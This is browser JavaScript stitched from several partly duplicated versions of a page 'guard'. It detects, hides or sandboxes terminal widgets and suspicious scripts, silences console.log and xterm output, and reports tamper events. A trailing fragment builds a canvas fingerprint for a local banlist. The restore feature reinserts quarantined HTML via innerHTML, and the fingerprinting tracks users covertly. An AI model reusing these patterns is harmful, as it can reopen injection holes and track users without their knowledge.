    node.style.pointerEvents = 'none';
    node.setAttribute('data-neutralized', 'true');
    node.setAttribute('data-neutralize-reason', reason);
    reportToServer({ event: 'neutralize', evidence: evidenceFor(node) });
    log('Neutralized node: ' + (node.id || node.className || node.tagName) + ' reason=' + reason);
    addEventRow({ time: Date.now(), selector: node.tagName, reason });
  } catch(e){
    log('Neutralize error: ' + String(e));
  }
}

/* Heuristic: detect nodes by selectors and by keyword matches in attributes/classes/src */
function isSuspicious(node){
  try {
    if (!node || node.nodeType !== 1) return false;
    // selector match
    for (const sel of SUSPICIOUS_SELECTORS) {
      if (node.matches && node.matches(sel)) return true;
    }
    // attribute/class/src text scan
    const text = (node.className || '') + ' ' + (node.id || '') + ' ' + (node.getAttribute && (node.getAttribute('data-protector') || '')) + ' ' + (node.src || node.href || '');
    for (const re of SUSPICIOUS_KEYWORDS) if (re.test(text)) return true;
    // behavioral heuristic: inline script that defines protector functions
    if (node.tagName === 'SCRIPT' && node.textContent && /protectOutput|maskOutput|interceptOutput|overrideWrite/.test(node.textContent)) return true;
    return false;
  } catch(e){ return false; }
}

/* Add event row to table */
function addEventRow(ev){
  const tbody = document.querySelector('#eventsTable tbody');
  const tr = document.createElement('tr');
  const time = new Date(ev.detectedAt || ev.time || Date.now()).toLocaleString();
  tr.innerHTML = `<td>${time}</td><td>${(ev.tag || ev.selector || '[unknown]')}</td><td>${ev.reason || ev.reason || 'suspicious'}</td>
    <td><button class="btn" data-action="restore">Restore</button> <button class="btn btn-danger" data-action="quarantine">Quarantine</button></td>`;
  tbody.prepend(tr);
}

/* Scan DOM and act according to mode */
function scanAndAct(){
  const nodes = Array.from(document.querySelectorAll(SUSPICIOUS_SELECTORS.join(',')));
  // also include any script/link nodes for keyword matches
  nodes.push(...Array.from(document.querySelectorAll('script,link,iframe,div')).filter(n => isSuspicious(n)));
  const seen = new Set();
  for (const n of nodes) {
    if (!n || seen.has(n)) continue;
    seen.add(n);
    if (n.hasAttribute && n.hasAttribute('data-allowed')) {
      log('Allowed node skipped: ' + (n.id || n.className || n.tagName));
      continue;
    }
    const reason = 'selector/keyword match';
    if (mode === 'audit') {
      log('Audit detected suspicious node: ' + (n.id || n.className || n.tagName));
      reportToServer({ event: 'audit_detect', evidence: evidenceFor(n) });
      addEventRow({ detectedAt: Date.now(), tag: n.tagName, reason: 'audit_detect' });
    } else {
      // enforce: quarantine if script or iframe, otherwise neutralize
      if (n.tagName === 'SCRIPT' || n.tagName === 'IFRAME') quarantineNode(n, reason);
      else neutralizeNode(n, reason);
    }
  }
}

/* Live monitoring: observe added nodes */
const observer = new MutationObserver(muts => {
  for (const m of muts) {
    for (const n of m.addedNodes) {
      if (n.nodeType !== 1) continue;
      if (isSuspicious(n) && !n.hasAttribute('data-allowed')) {
        if (mode === 'audit') {
          reportToServer({ event: 'audit_detect', evidence: evidenceFor(n) });
          log('Audit detect (live): ' + (n.tagName || 'node'));
          addEventRow({ detectedAt: Date.now(), tag: n.tagName, reason: 'live_audit' });
        } else {
          if (n.tagName === 'SCRIPT' || n.tagName === 'IFRAME') quarantineNode(n, 'live_injection');
          else neutralizeNode(n, 'live_injection');
        }
      }
    }
  }
});
observer.observe(document.documentElement, { childList: true, subtree: true });

/* UI bindings */
document.getElementById('refresh').addEventListener('click', () => { scanAndAct(); log('Manual scan triggered'); });
document.getElementById('toggleMode').addEventListener('click', () => {
  mode = (mode === 'audit') ? 'enforce' : 'audit';
  document.getElementById('toggleMode').textContent = 'Mode: ' + (mode === 'audit' ? 'Audit' : 'Enforce');
  log('Mode switched to ' + mode);
});
document.getElementById('markAllowed').addEventListener('click', () => {
  const sel = document.getElementById('allowSelector').value.trim();
  if (!sel) return alert('Enter a selector');
  const nodes = document.querySelectorAll(sel);
  nodes.forEach(n => n.setAttribute('data-allowed', 'true'));
  alert('Marked ' + nodes.length + ' node(s) allowed');
});
document.getElementById('allowAll').addEventListener('click', () => {
  document.querySelectorAll('.terminal, .xterm, x-terminal').forEach(n => n.setAttribute('data-allowed', 'true'));
  alert('All embedded terminals marked allowed');
});

/* Initial scan on load */
scanAndAct();
log('Terminal Output Protector Guard initialized (mode=' + mode + ')');/* CONFIG: set server endpoint and auth headers */
const API_BASE = '/admin/api'; // must be implemented server-side
const AUTH_HEADERS = { 'X-Admin-Token': 'REPLACE_WITH_SECURE_TOKEN' };

/* Detection & heuristics */
const DEFAULT_SELECTORS = ['.terminal', '.xterm', 'x-terminal', '[data-terminal]', 'iframe.terminal-frame'];
const KEYWORD_RE = /(protector|maskOutput|interceptOutput|overrideWrite|scent|tweaker)/i;

/* Mode: 'audit' (log/report only) or 'enforce' (neutralize + quarantine) */
let mode = 'audit';

/* Logging helper */
function log(msg){
  const el = document.getElementById('log');
  el.textContent = new Date().toISOString() + ' ' + msg + '\\n' + el.textContent;
  console.log(msg);
}

/* Evidence builder */
function evidenceFor(node){
  try {
    return {
      tag: node.tagName,
      id: node.id || null,
      classes: node.className || null,
      snippet: node.outerHTML ? node.outerHTML.slice(0,1200) : null,
      detectedAt: Date.now()
    };
  } catch(e){ return { tag: node.tagName, detectedAt: Date.now(), error: String(e) }; }
}

/* Report to server (best-effort) */
function report(payload){
  try { navigator.sendBeacon(API_BASE + '/tamper-log', JSON.stringify(payload)); }
  catch(e){ fetch(API_BASE + '/tamper-log', {method:'POST', headers: Object.assign({'Content-Type':'application/json'}, AUTH_HEADERS), body: JSON.stringify(payload)}).catch(()=>{}); }
}

/* Create hidden sandbox iframe for quarantined copies */
function getOrCreateSandbox(){
  let iframe = document.getElementById('__terminal_quarantine_sandbox');
  if (iframe) return iframe;
  iframe = document.createElement('iframe');
  iframe.id = '__terminal_quarantine_sandbox';
  iframe.sandbox = 'allow-scripts'; // minimal privileges; do not allow same-origin
  iframe.style.display = 'none';
  iframe.srcdoc = '<!doctype html><html><body></body></html>';
  document.body.appendChild(iframe);
  return iframe;
}

/* Remove event listeners by cloning without listeners */
function cloneWithoutListeners(node){
  try {
    const clone = node.cloneNode(true);
    // remove inline event handler attributes
    for (const attr of Array.from(clone.attributes || [])) {
      if (/^on/i.test(attr.name)) clone.removeAttribute(attr.name);
    }
    return clone;
  } catch(e){ return null; }
}

/* Monkey-patch common terminal APIs to no-op (xterm.js example) */
function patchTerminalAPIs(){
  try {
    // xterm.js: Terminal.prototype.write
    const Term = window.Terminal || (window.XTerm && window.XTerm.Terminal) || null;
    if (Term && Term.prototype && !Term.prototype.__write_patched) {
      const origWrite = Term.prototype.write;
      Term.prototype.write = function(data){
        // no-op: prevent output
        return this;
      };
      Term.prototype.__write_patched = true;
      log('Patched xterm Terminal.prototype.write to no-op');
      report({ event:'api_patch', api:'xterm.write', ts:Date.now() });
    }
    // patch other common names (best-effort)
    if (window.Terminal && window.Terminal.write && !window.Terminal.__write_patched_global) {
      const orig = window.Terminal.write;
      window.Terminal.write = function(){ return; };
      window.Terminal.__write_patched_global = true;
      log('Patched global Terminal.write');
    }
  } catch(e){ log('API patch error: ' + e); }
}

/* Neutralize node in-place (hide, disable pointer events, strip listeners) */
function neutralizeNode(node, reason){
  try {
    node.style.display = 'none';
    node.style.pointerEvents = 'none';
    node.setAttribute('data-neutralized', 'true');
    node.setAttribute('data-neutralize-reason', reason);
    // attempt to remove inline handlers
    for (const attr of Array.from(node.attributes || [])) if (/^on/i.test(attr.name)) node.removeAttribute(attr.name);
    // replace textContent to prevent output reads
    try { node.textContent = ''; } catch(e){}
    report({ event:'neutralize', reason, evidence: evidenceFor(node) });
    log('Neutralized node: ' + (node.id || node.className || node.tagName) + ' reason=' + reason);
  } catch(e){ log('Neutralize failed: ' + e); }
}

/* Quarantine: copy into sandbox and remove original */
function quarantineNode(node, reason){
  try {
    const ev = evidenceFor(node);
    ev.reason = reason;
    report({ event:'quarantine', evidence: ev });
    const sandbox = getOrCreateSandbox();
    const holder = sandbox.contentDocument.createElement('div');
    holder.setAttribute('data-quarantine-ts', Date.now());
    // clone without listeners to avoid executing scripts
    const clone = cloneWithoutListeners(node) || document.createElement('div');
    clone.setAttribute('data-quarantined', 'true');
    holder.appendChild(clone);
    sandbox.contentDocument.body.appendChild(holder);
    node.remove();
    log('Quarantined node: ' + (node.id || node.className || node.tagName) + ' reason=' + reason);
    // store last quarantine for restore
    window.__lastQuarantine = { html: holder.innerHTML, ts: Date.now() };
  } catch (err) {
    try { node.remove(); } catch(e){}
    log('Quarantine failed: ' + err);
  }
}

/* Heuristic: is node suspicious? */
function isSuspicious(node){
  try {
    if (!node || node.nodeType !== 1) return false;
    if (node.hasAttribute && node.hasAttribute('data-allowed')) return false;
    // selector match
    for (const sel of DEFAULT_SELECTORS) {
      if (node.matches && node.matches(sel)) return true;
    }
    // attribute/class/src text scan
    const text = (node.className || '') + ' ' + (node.id || '') + ' ' + (node.getAttribute && (node.getAttribute('data-protector') || '')) + ' ' + (node.src || node.href || '');
    if (KEYWORD_RE.test(text)) return true;
    // inline script content heuristic
    if (node.tagName === 'SCRIPT' && node.textContent && /protectOutput|maskOutput|interceptOutput|overrideWrite/.test(node.textContent)) return true;
    return false;
  } catch(e){ return false; }
}

/* Scan DOM and act according to mode */
function scanAndAct(){
  patchTerminalAPIs(); // always attempt to patch APIs first
  const candidates = new Set();
  // gather by selectors
  for (const sel of DEFAULT_SELECTORS) {
    document.querySelectorAll(sel).forEach(n => candidates.add(n));
  }
  // also scan scripts/iframes/divs for keyword matches
  document.querySelectorAll('script,iframe,div').forEach(n => { if (isSuspicious(n)) candidates.add(n); });

  for (const n of candidates) {
    if (!n || n.hasAttribute && n.hasAttribute('data-allowed')) continue;
    const reason = 'heuristic_match';
    if (mode === 'audit') {
      report({ event:'audit_detect', evidence: evidenceFor(n) });
      log('Audit detected suspicious node: ' + (n.id || n.className || n.tagName));
    } else {
      if (n.tagName === 'SCRIPT' || n.tagName === 'IFRAME') quarantineNode(n, reason);
      else neutralizeNode(n, reason);
    }
  }
}

/* Live monitoring for dynamic injections */
const observer = new MutationObserver(muts => {
  for (const m of muts) {
    for (const n of m.addedNodes) {
      if (n.nodeType !== 1) continue;
      if (isSuspicious(n) && !n.hasAttribute('data-allowed')) {
        if (mode === 'audit') {
          report({ event:'audit_detect', evidence: evidenceFor(n) });
          log('Live audit detect: ' + (n.tagName || 'node'));
        } else {
          if (n.tagName === 'SCRIPT' || n.tagName === 'IFRAME') quarantineNode(n, 'live_injection');
          else neutralizeNode(n, 'live_injection');
        }
      }
    }
  }
});
observer.observe(document.documentElement, { childList: true, subtree: true });

/* UI bindings */
document.getElementById('scanBtn').addEventListener('click', () => { scanAndAct(); log('Manual scan triggered'); });
document.getElementById('modeToggle').addEventListener('click', () => {
  mode = (mode === 'audit') ? 'enforce' : 'audit';
  document.getElementById('modeToggle').textContent = 'Mode: ' + (mode === 'audit' ? 'Audit' : 'Enforce');
  log('Mode switched to ' + mode);
});
document.getElementById('allowAll').addEventListener('click', () => {
  document.querySelectorAll('.terminal, .xterm, x-terminal').forEach(n => n.setAttribute('data-allowed','true'));
  alert('All embedded terminals marked allowed');
});
document.getElementById('restoreBtn').addEventListener('click', () => {
  if (!window.__lastQuarantine) return alert('No quarantine to restore');
  const sandbox = getOrCreateSandbox();
  const html = window.__lastQuarantine.html;
  // restore into a safe container (admin must review)
  const container = document.createElement('div');
  container.innerHTML = html;
  container.setAttribute('data-restored', Date.now());
  document.body.appendChild(container);
  log('Restored last quarantine into page (review required)');
  report({ event:'restore', ts:Date.now(), note:'restored last quarantine copy into page for review' });
});

/* Allow selector input: mark matched nodes allowed */
document.getElementById('allowSelector').addEventListener('change', (e) => {
  const sel = e.target.value.trim();
  if (!sel) return;
  const nodes = document.querySelectorAll(sel);
  nodes.forEach(n => n.setAttribute('data-allowed','true'));
  alert('Marked ' + nodes.length + ' node(s) allowed');
});

/* Initial scan */
scanAndAct();
log('Terminal Quarantine Guard initialized (mode=' + mode + ')');/* CONFIG: set server endpoint and auth headers */
const API_BASE = '/admin/api'; // server must implement /tamper-log etc.
const AUTH_HEADERS = { 'X-Admin-Token': 'REPLACE_WITH_SECURE_TOKEN' };

/* Heuristics and selectors */
const SELECTORS = ['.shadow-protector', '.terminal', '.xterm', 'x-terminal', '[data-protector]'];
const KEYWORD_RE = /(protectOutput|maskOutput|interceptOutput|overrideWrite|shadowSelf|scent|tweaker)/i;

/* Mode: 'audit' or 'enforce' */
let mode = 'audit';

/* Logging */
function log(msg){
  const el = document.getElementById('log');
  el.textContent = new Date().toISOString() + ' ' + msg + '\\n' + el.textContent;
  console.log(msg);
}

/* Evidence builder */
function evidenceFor(node){
  try {
    return { tag: node.tagName, id: node.id||null, classes: node.className||null, snippet: node.outerHTML?node.outerHTML.slice(0,1200):null, ts: Date.now() };
  } catch(e){ return { tag: node.tagName, ts: Date.now(), error: String(e) }; }
}

/* Report to server (best-effort) */
function report(payload){
  try { navigator.sendBeacon(API_BASE + '/tamper-log', JSON.stringify(payload)); }
  catch(e){ fetch(API_BASE + '/tamper-log', {method:'POST', headers: Object.assign({'Content-Type':'application/json'}, AUTH_HEADERS), body: JSON.stringify(payload)}).catch(()=>{}); }
}

/* Sandbox creation for quarantined copies */
function getOrCreateSandbox(){
  let iframe = document.getElementById('__shadow_quarantine');
  if (iframe) return iframe;
  iframe = document.createElement('iframe');
  iframe.id = '__shadow_quarantine';
  iframe.sandbox = 'allow-scripts'; // minimal privileges
  iframe.style.display = 'none';
  iframe.srcdoc = '<!doctype html><html><body></body></html>';
  document.body.appendChild(iframe);
  return iframe;
}

/* Clone without inline event handlers */
function cloneSanitized(node){
  try {
    const clone = node.cloneNode(true);
    for (const attr of Array.from(clone.attributes || [])) if (/^on/i.test(attr.name)) clone.removeAttribute(attr.name);
    // remove script tags inside clone
    clone.querySelectorAll && clone.querySelectorAll('script').forEach(s => s.remove());
    return clone;
  } catch(e){ return null; }
}

/* Patch common output APIs (best-effort) */
function patchOutputAPIs(){
  try {
    const Term = window.Terminal || (window.XTerm && window.XTerm.Terminal) || null;
    if (Term && Term.prototype && !Term.prototype.__patched_noop) {
      Term.prototype.write = function(){ return this; };
      Term.prototype.__patched_noop = true;
      log('Patched Terminal.prototype.write to no-op');
      report({ event:'api_patch', api:'Terminal.write', ts:Date.now() });
    }
    if (window.console && !window.console.__patched_noop) {
      const origLog = console.log;
      console.log = function(){ /* no-op to prevent exfil via console */ };
      console.__patched_noop = true;
      log('Patched console.log to no-op (temporary)');
      report({ event:'api_patch', api:'console.log', ts:Date.now() });
      // restore is possible by reassigning origLog if needed
    }
  } catch(e){ log('API patch error: ' + e); }
}

/* Neutralize in-place */
function neutralize(node, reason){
  try {
    node.style.display = 'none';
    node.style.pointerEvents = 'none';
    node.setAttribute('data-neutralized','true');
    node.setAttribute('data-neutralize-reason', reason);
    for (const attr of Array.from(node.attributes || [])) if (/^on/i.test(attr.name)) node.removeAttribute(attr.name);
    try { node.textContent = ''; } catch(e){}
    report({ event:'neutralize', reason, evidence: evidenceFor(node) });
    log('Neutralized: ' + (node.id || node.className || node.tagName) + ' reason=' + reason);
  } catch(e){ log('Neutralize failed: ' + e); }
}

/* Quarantine (copy sanitized clone into sandbox and remove original) */
function quarantine(node, reason){
  try {
    const ev = evidenceFor(node); ev.reason = reason;
    report({ event:'quarantine', evidence: ev });
    const sandbox = getOrCreateSandbox();
    const holder = sandbox.contentDocument.createElement('div');
    holder.setAttribute('data-quarantine-ts', Date.now());
    const clone = cloneSanitized(node) || document.createElement('div');
    clone.setAttribute('data-quarantined','true');
    holder.appendChild(clone);
    sandbox.contentDocument.body.appendChild(holder);
    node.remove();
    window.__lastQuarantine = { html: holder.innerHTML, ts: Date.now() };
    log('Quarantined: ' + (node.id || node.className || node.tagName) + ' reason=' + reason);
  } catch(e){ try { node.remove(); } catch(_){}; log('Quarantine failed: ' + e); }
}

/* Heuristic detection */
function isSuspicious(node){
  try {
    if (!node || node.nodeType !== 1) return false;
    if (node.hasAttribute && node.hasAttribute('data-allowed')) return false;
    for (const sel of SELECTORS) if (node.matches && node.matches(sel)) return true;
    const text = (node.className||'') + ' ' + (node.id||'') + ' ' + (node.getAttribute && (node.getAttribute('data-protector')||'')) + ' ' + (node.src||node.href||'');
    if (KEYWORD_RE.test(text)) return true;
    if (node.tagName === 'SCRIPT' && node.textContent && /protectOutput|maskOutput|interceptOutput|overrideWrite/.test(node.textContent)) return true;
    return false;
  } catch(e){ return false; }
}

/* Scan and act */
function scanAndAct(){
  patchOutputAPIs();
  const candidates = new Set();
  for (const sel of SELECTORS) document.querySelectorAll(sel).forEach(n => candidates.add(n));
  document.querySelectorAll('script,iframe,div').forEach(n => { if (isSuspicious(n)) candidates.add(n); });
  for (const n of candidates) {
    if (!n || (n.hasAttribute && n.hasAttribute('data-allowed'))) continue;
    const reason = 'heuristic_match';
    if (mode === 'audit') {
      report({ event:'audit_detect', evidence: evidenceFor(n) });
      log('Audit detected: ' + (n.id || n.className || n.tagName));
    } else {
      if (n.tagName === 'SCRIPT' || n.tagName === 'IFRAME') quarantine(n, reason);
      else neutralize(n, reason);
    }
  }
}

/* Live monitoring */
const observer = new MutationObserver(muts => {
  for (const m of muts) for (const n of m.addedNodes) {
    if (n.nodeType !== 1) continue;
    if (isSuspicious(n) && !n.hasAttribute('data-allowed')) {
      if (mode === 'audit') { report({ event:'audit_detect', evidence: evidenceFor(n) }); log('Live audit detect: ' + n.tagName); }
      else { if (n.tagName === 'SCRIPT' || n.tagName === 'IFRAME') quarantine(n,'live_injection'); else neutralize(n,'live_injection'); }
    }
  }
});
observer.observe(document.documentElement, { childList:true, subtree:true });

/* UI bindings */
document.getElementById('scanBtn').addEventListener('click', () => { scanAndAct(); log('Manual scan triggered'); });
document.getElementById('modeToggle').addEventListener('click', () => {
  mode = (mode === 'audit') ? 'enforce' : 'audit';
  document.getElementById('modeToggle').textContent = 'Mode: ' + (mode === 'audit' ? 'Audit' : 'Enforce');
  log('Mode switched to ' + mode);
});
document.getElementById('allowAll').addEventListener('click', () => {
  document.querySelectorAll('.terminal, .xterm, x-terminal, .shadow-protector').forEach(n => n.setAttribute('data-allowed','true'));
  alert('All embedded terminals marked allowed');
});
document.getElementById('restoreBtn').addEventListener('click', () => {
  if (!window.__lastQuarantine) return alert('No quarantine to restore');
  const container = document.createElement('div');
  container.innerHTML = window.__lastQuarantine.html;
  container.setAttribute('data-restored', Date.now());
  document.body.appendChild(container);
  log('Restored last quarantine into page (review required)');
  report({ event:'restore', ts:Date.now(), note:'restored last quarantine copy into page for review' });
});
document.getElementById('allowSelector').addEventListener('change', (e) => {
  const sel = e.target.value.trim();
  if (!sel) return;
  const nodes = document.querySelectorAll(sel);
  nodes.forEach(n => n.setAttribute('data-allowed','true'));
  alert('Marked ' + nodes.length + ' node(s) allowed');
});

/* Initial scan */
scanAndAct();
log('Shadow Protector Guard initialized (mode=' + mode + ')');/* CONFIG: set server endpoint and auth headers */
const API_BASE = '/admin/api'; // server must implement /tamper-log etc.
const AUTH_HEADERS = { 'X-Admin-Token': 'REPLACE_WITH_SECURE_TOKEN' };

/* Heuristics and selectors */
const SELECTORS = ['.shadow-protector', '.terminal', '.xterm', 'x-terminal', '[data-protector]'];
const KEYWORD_RE = /(protectOutput|maskOutput|interceptOutput|overrideWrite|shadowSelf|scent|tweaker)/i;

/* Mode: 'audit' or 'enforce' */
let mode = 'audit';

/* Logging */
function log(msg){
  const el = document.getElementById('log');
  el.textContent = new Date().toISOString() + ' ' + msg + '\\n' + el.textContent;
  console.log(msg);
}

/* Evidence builder */
function evidenceFor(node){
  try {
    return { tag: node.tagName, id: node.id||null, classes: node.className||null, snippet: node.outerHTML?node.outerHTML.slice(0,1200):null, ts: Date.now() };
  } catch(e){ return { tag: node.tagName, ts: Date.now(), error: String(e) }; }
}

/* Report to server (best-effort) */
function report(payload){
  try { navigator.sendBeacon(API_BASE + '/tamper-log', JSON.stringify(payload)); }
  catch(e){ fetch(API_BASE + '/tamper-log', {method:'POST', headers: Object.assign({'Content-Type':'application/json'}, AUTH_HEADERS), body: JSON.stringify(payload)}).catch(()=>{}); }
}

/* Sandbox creation for quarantined copies */
function getOrCreateSandbox(){
  let iframe = document.getElementById('__shadow_quarantine');
  if (iframe) return iframe;
  iframe = document.createElement('iframe');
  iframe.id = '__shadow_quarantine';
  iframe.sandbox = 'allow-scripts'; // minimal privileges
  iframe.style.display = 'none';
  iframe.srcdoc = '<!doctype html><html><body></body></html>';
  document.body.appendChild(iframe);
  return iframe;
}

/* Clone without inline event handlers */
function cloneSanitized(node){
  try {
    const clone = node.cloneNode(true);
    for (const attr of Array.from(clone.attributes || [])) if (/^on/i.test(attr.name)) clone.removeAttribute(attr.name);
    // remove script tags inside clone
    clone.querySelectorAll && clone.querySelectorAll('script').forEach(s => s.remove());
    return clone;
  } catch(e){ return null; }
}

/* Patch common output APIs (best-effort) */
function patchOutputAPIs(){
  try {
    const Term = window.Terminal || (window.XTerm && window.XTerm.Terminal) || null;
    if (Term && Term.prototype && !Term.prototype.__patched_noop) {
      Term.prototype.write = function(){ return this; };
      Term.prototype.__patched_noop = true;
      log('Patched Terminal.prototype.write to no-op');
      report({ event:'api_patch', api:'Terminal.write', ts:Date.now() });
    }
    if (window.console && !window.console.__patched_noop) {
      const origLog = console.log;
      console.log = function(){ /* no-op to prevent exfil via console */ };
      console.__patched_noop = true;
      log('Patched console.log to no-op (temporary)');
      report({ event:'api_patch', api:'console.log', ts:Date.now() });
      // restore is possible by reassigning origLog if needed
    }
  } catch(e){ log('API patch error: ' + e); }
}

/* Neutralize in-place */
function neutralize(node, reason){
  try {
    node.style.display = 'none';
    node.style.pointerEvents = 'none';
    node.setAttribute('data-neutralized','true');
    node.setAttribute('data-neutralize-reason', reason);
    for (const attr of Array.from(node.attributes || [])) if (/^on/i.test(attr.name)) node.removeAttribute(attr.name);
    try { node.textContent = ''; } catch(e){}
    report({ event:'neutralize', reason, evidence: evidenceFor(node) });
    log('Neutralized: ' + (node.id || node.className || node.tagName) + ' reason=' + reason);
  } catch(e){ log('Neutralize failed: ' + e); }
}

/* Quarantine (copy sanitized clone into sandbox and remove original) */
function quarantine(node, reason){
  try {
    const ev = evidenceFor(node); ev.reason = reason;
    report({ event:'quarantine', evidence: ev });
    const sandbox = getOrCreateSandbox();
    const holder = sandbox.contentDocument.createElement('div');
    holder.setAttribute('data-quarantine-ts', Date.now());
    const clone = cloneSanitized(node) || document.createElement('div');
    clone.setAttribute('data-quarantined','true');
    holder.appendChild(clone);
    sandbox.contentDocument.body.appendChild(holder);
    node.remove();
    window.__lastQuarantine = { html: holder.innerHTML, ts: Date.now() };
    log('Quarantined: ' + (node.id || node.className || node.tagName) + ' reason=' + reason);
  } catch(e){ try { node.remove(); } catch(_){}; log('Quarantine failed: ' + e); }
}

/* Heuristic detection */
function isSuspicious(node){
  try {
    if (!node || node.nodeType !== 1) return false;
    if (node.hasAttribute && node.hasAttribute('data-allowed')) return false;
    for (const sel of SELECTORS) if (node.matches && node.matches(sel)) return true;
    const text = (node.className||'') + ' ' + (node.id||'') + ' ' + (node.getAttribute && (node.getAttribute('data-protector')||'')) + ' ' + (node.src||node.href||'');
    if (KEYWORD_RE.test(text)) return true;
    if (node.tagName === 'SCRIPT' && node.textContent && /protectOutput|maskOutput|interceptOutput|overrideWrite/.test(node.textContent)) return true;
    return false;
  } catch(e){ return false; }
}

/* Scan and act */
function scanAndAct(){
  patchOutputAPIs();
  const candidates = new Set();
  for (const sel of SELECTORS) document.querySelectorAll(sel).forEach(n => candidates.add(n));
  document.querySelectorAll('script,iframe,div').forEach(n => { if (isSuspicious(n)) candidates.add(n); });
  for (const n of candidates) {
    if (!n || (n.hasAttribute && n.hasAttribute('data-allowed'))) continue;
    const reason = 'heuristic_match';
    if (mode === 'audit') {
      report({ event:'audit_detect', evidence: evidenceFor(n) });
      log('Audit detected: ' + (n.id || n.className || n.tagName));
    } else {
      if (n.tagName === 'SCRIPT' || n.tagName === 'IFRAME') quarantine(n, reason);
      else neutralize(n, reason);
    }
  }
}

/* Live monitoring */
const observer = new MutationObserver(muts => {
  for (const m of muts) for (const n of m.addedNodes) {
    if (n.nodeType !== 1) continue;
    if (isSuspicious(n) && !n.hasAttribute('data-allowed')) {
      if (mode === 'audit') { report({ event:'audit_detect', evidence: evidenceFor(n) }); log('Live audit detect: ' + n.tagName); }
      else { if (n.tagName === 'SCRIPT' || n.tagName === 'IFRAME') quarantine(n,'live_injection'); else neutralize(n,'live_injection'); }
    }
  }
});
observer.observe(document.documentElement, { childList:true, subtree:true });

/* UI bindings */
document.getElementById('scanBtn').addEventListener('click', () => { scanAndAct(); log('Manual scan triggered'); });
document.getElementById('modeToggle').addEventListener('click', () => {
  mode = (mode === 'audit') ? 'enforce' : 'audit';
  document.getElementById('modeToggle').textContent = 'Mode: ' + (mode === 'audit' ? 'Audit' : 'Enforce');
  log('Mode switched to ' + mode);
});
document.getElementById('allowAll').addEventListener('click', () => {
  document.querySelectorAll('.terminal, .xterm, x-terminal, .shadow-protector').forEach(n => n.setAttribute('data-allowed','true'));
  alert('All embedded terminals marked allowed');
});
document.getElementById('restoreBtn').addEventListener('click', () => {
  if (!window.__lastQuarantine) return alert('No quarantine to restore');
  const container = document.createElement('div');
  container.innerHTML = window.__lastQuarantine.html;
  container.setAttribute('data-restored', Date.now());
  document.body.appendChild(container);
  log('Restored last quarantine into page (review required)');
  report({ event:'restore', ts:Date.now(), note:'restored last quarantine copy into page for review' });
});
document.getElementById('allowSelector').addEventListener('change', (e) => {
  const sel = e.target.value.trim();
  if (!sel) return;
  const nodes = document.querySelectorAll(sel);
  nodes.forEach(n => n.setAttribute('data-allowed','true'));
  alert('Marked ' + nodes.length + ' node(s) allowed');
});

/* Initial scan */
scanAndAct();
log('Shadow Protector Guard initialized (mode=' + mode + ')');and <link> nodes ===== */
  const ALLOWED_SCRIPT_SRCS = new Set([
    location.origin + '/app.bundle.js',
    'https://trusted.cdn.example/lib.js'
  ]);

  function nodeIsAllowed(node) {
    if (node.tagName === 'SCRIPT' && node.src) {
      return ALLOWED_SCRIPT_SRCS.has(node.src);
    }
    if (node.tagName === 'LINK' && node.rel === 'stylesheet' && node.href) {
      // allow styles from same origin or trusted CDN (adjust as needed)
      return node.href.startsWith(location.origin) || node.href.includes('trusted.cdn.example');
    }
    return true;
  }

  const observer = new MutationObserver(muts => {
    for (const m of muts) {
      for (const n of m.addedNodes) {
        if (n.nodeType !== 1) continue;
        if ((n.tagName === 'SCRIPT' || n.tagName === 'LINK') && !nodeIsAllowed(n)) {
          console.warn('Removed unauthorized node', n);
          n.remove();
          document.getElementById('status').textContent = 'Removed unauthorized resource';
        }
      }
    }
  });

  observer.observe(document.documentElement, { childList: true, subtree: true });

  /* ===== Simple integrity canary and periodic self-check ===== */
  function checkCanonicalStyle() {
    const style = document.getElementById('canonical-style');
    if (!style) {
      // reinsert minimal critical style if removed
      const s = document.createElement('style');
      s.id = 'canonical-style';
      s.textContent = ':root{--bg:#0b5cff;--fg:#fff}body{background:var(--bg)!important;color:var(--fg)!important}';
      document.head.appendChild(s);
      document.getElementById('status').textContent = 'Reapplied critical styles';
      console.warn('Reapplied canonical style');
    }
  }
  setInterval(checkCanonicalStyle, 5000);

  /* ===== Sandboxed iframe communication (postMessage with validation) ===== */
  const iframe = document.getElementById('sandbox');
  iframe.addEventListener('load', () => {
    // send a short-lived token or init message
    iframe.contentWindow.postMessage({ cmd: 'init', nonce: 'short-lived-token' }, '*');
  });

  window.addEventListener('message', e => {
    if (e.source !== iframe.contentWindow) return;
    // Strictly validate message shape and origin if using src instead of srcdoc
    const data = e.data;
    if (data && data.type === 'pong' && data.nonce === 'short-lived-token') {
      console.info('Sandbox responded correctly');
    } else {
      console.warn('Unexpected message from sandbox', data);
    }
  });

  /* ===== Minimal logging endpoint (demo: console only). Replace with secure server endpoint in production. ===== */
  function logEvent(level, msg) {
    console[level](msg);
    // Example: send to /log endpoint with fetch (ensure CORS and auth)
    // fetch('/log', { method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify({level,msg,t:Date.now()}) });
  }

  // Expose for debugging in demo
  window.__demo = { loadModuleSafely, ALLOWED_MODULES, logEvent };/* ===== Simple fingerprint (userAgent + platform + timezone + canvas hash) ===== */
async function canvasHash() {
  try {
    const c = document.createElement('canvas');
    c.width = 200; c.height = 50;
    const ctx = c.getContext('2d');
    ctx.textBaseline = 'top';
    ctx.font = '16px Arial';
    ctx.fillStyle = '#f60';
    ctx.fillRect(0, 0, 200, 50);
    ctx.fillStyle = '#069';
    ctx.fillText('fingerprint-demo-'+navigator.userAgent, 2, 2);
    const data = c.toDataURL();
    const b = atob(data.split(',')[1]);
    const arr = new Uint8Array(b.length);
    for (let i=0;i<b.length;i++) arr[i]=b.charCodeAt(i);
    const hashBuf = await crypto.subtle.digest('SHA-256', arr);
    const hashArray = Array.from(new Uint8Array(hashBuf));
    return hashArray.map(b => b.toString(16).padStart(2,'0')).join('');
  } catch (e) {
    return 'no-canvas';
  }
}

async function computeFingerprint() {
  const ua = navigator.userAgent || 'unknown';
  const platform = navigator.platform || 'unknown';
  const tz = Intl.DateTimeFormat().resolvedOptions().timeZone || 'unknown';
  const ch = await canvasHash();
  const raw = `${ua}|${platform}|${tz}|${ch}`;
  const enc = new TextEncoder().encode(raw);
  const hashBuf = await crypto.subtle.digest('SHA-256', enc);
  const hashArray = Array.from(new Uint8Array(hashBuf));
  return hashArray.map(b => b.toString(16).padStart(2,'0')).join('');
}

/* ===== Local banlist storage helpers ===== */
const BAN_KEY = 'local_banlist_v1';
function readBanlist() {
  try {
    const raw = localStorage.getItem(BAN_KEY);
    return raw ? JSON.parse(raw) : [];
  } catch (e) { return []; }
}
function writeBanlist(list) {
